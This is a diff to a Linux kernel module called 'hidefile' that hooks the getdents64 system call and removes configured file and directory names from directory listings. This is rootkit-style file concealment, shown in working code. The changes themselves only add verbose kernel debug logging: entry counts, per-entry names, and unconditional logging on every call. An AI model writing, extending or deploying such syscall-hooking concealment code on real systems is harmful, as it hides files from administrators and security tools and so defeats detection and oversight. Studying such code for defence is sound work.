@@ -147,6 +147,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 	int count, new_count;
 	char name[256];
 	int entries_hidden = 0;
+	int entries_total = 0;
 	int i;
 
 	/* Get arguments: x0=fd, x1=dirent */
@@ -155,16 +156,16 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 	/* Call original */
 	ret = orig_getdents64(regs);
 
+	pr_info("[hidefile] *** getdents64 CALLED *** ret=%ld, dirent=%px\n", ret, dirent);
+
 	if (ret <= 0)
 		return ret;
 
 	count = (int)ret;
 
-	/* Skip if no hidden entries configured */
-	if (hidden_count == 0)
-		return ret;
-
-	pr_info("[hidefile] getdents64 hooked: ret=%d, dirent=%px\n", (int)ret, dirent);
+	/* Always log when getdents64 is called */
+	pr_info("[hidefile] getdents64 hooked: ret=%d, dirent=%px, hidden_count=%d\n", 
+		(int)ret, dirent, hidden_count);
 	pr_info("[hidefile] hidden list (%d entries):\n", hidden_count);
 	for (i = 0; i < hidden_count; i++) {
 		if (hidden_files[i].active)
@@ -201,11 +202,15 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 
 		memset(name, 0, sizeof(name));
 		strncpy(name, curr->d_name, sizeof(name) - 1);
+		entries_total++;
+
+		pr_info("[hidefile]   [%d] entry: name=%s, d_type=%d (%s)",
+			entries_total, name, curr->d_type,
+			curr->d_type == DT_DIR ? "DIR" : "FILE");
 
 		if (is_hidden(name, curr->d_type == DT_DIR)) {
 			entries_hidden++;
-			pr_info("[hidefile] HIDING: name=%s, d_type=%d\n",
-				name, curr->d_type);
+			pr_info("[hidefile]   --> HIDDEN: %s", name);
 		} else {
 			/* Keep this entry */
 			if (write_ptr != curr)
@@ -217,8 +222,8 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 		curr = (struct linux_dirent64 *)((char *)curr + reclen);
 	}
 
-	pr_info("[hidefile] result: hidden=%d, orig=%d, new=%d\n",
-		entries_hidden, count, new_count);
+	pr_info("[hidefile] === RESULT: total=%d, hidden=%d, returned=%d ===\n",
+		entries_total, entries_hidden, new_count);
 
 	/* Copy back to user space if entries were hidden */
 	if (new_count < count) {
